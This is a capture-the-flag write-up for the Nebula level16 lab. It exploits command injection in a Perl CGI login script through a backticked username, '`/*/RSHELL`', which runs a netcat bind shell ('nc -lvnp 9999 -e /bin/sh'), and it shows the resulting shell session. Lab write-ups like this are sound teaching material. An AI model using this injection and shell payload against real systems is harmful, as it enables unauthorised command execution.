+++
author = "pwntester"
categories = ["nebula16"]
date = 2013-11-26T17:34:00Z
description = ""
draft = false
slug = "nebula-level16-write-up"
tags = ["nebula16"]
title = "Nebula level16 write-up"

+++

In [Level 16]() we are given the following perl CGI:

```lang-bash line-numbers 
#!/usr/bin/env perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub login {
  $username = $_[0];
  $password = $_[1];

  $username =~ tr/a-z/A-Z/;  # conver to uppercase
  $username =~ s/\s.*//;    # strip everything after a space

  @output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
  foreach $line (@output) {
    ($usr, $pw) = split(/:/, $line);


    if($pw =~ $password) {
      return 1;
    }
  }

  return 0;
}

sub htmlz {
  print("<html><head><title>Login resuls</title></head><body>");
  if($_[0] == 1) {
    print("Your login was accepted<br/>");
  } else {
    print("Your login failed<br/>");
  }
  print("Would you like a cookie?<br/><br/></body></html>\n");
}

htmlz(login(param("username"), param("password")));

```

Its easy to see the command injection in the egrep command:

```lang-bash line-numbers 
@output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
```

Now, the hard part is that we are limited to uppercase. We will create our regular payload, something like:

```lang-bash line-numbers 
level16@nebula:/tmp$ cat /tmp/RSHELL
#!/bin/bash
nc -lvnp 9999 -e /bin/sh
level16@nebula:/tmp$ chmod +x RSHELL
```

All we need to do now is find a way to put our payload in the server path and as that looks impossible, we will use a **bash** trick that allows us to use wildcards. So to execute **/tmp/RSHELL** we can use:

```lang-bash line-numbers 
/*/RSHELL
```

Now, go to your browser, and use the following username:

```lang-bash line-numbers 
`/*/RSHELL`
```

Back to our terminal, we will connect to the nc listener:

```lang-bash line-numbers 
level16@nebula:/home/flag16$ nc 127.0.0.1 9999
id
uid=983(flag16) gid=983(flag16) groups=983(flag16)
getflag
You have successfully executed getflag on a target account
^C
```

Voila!!
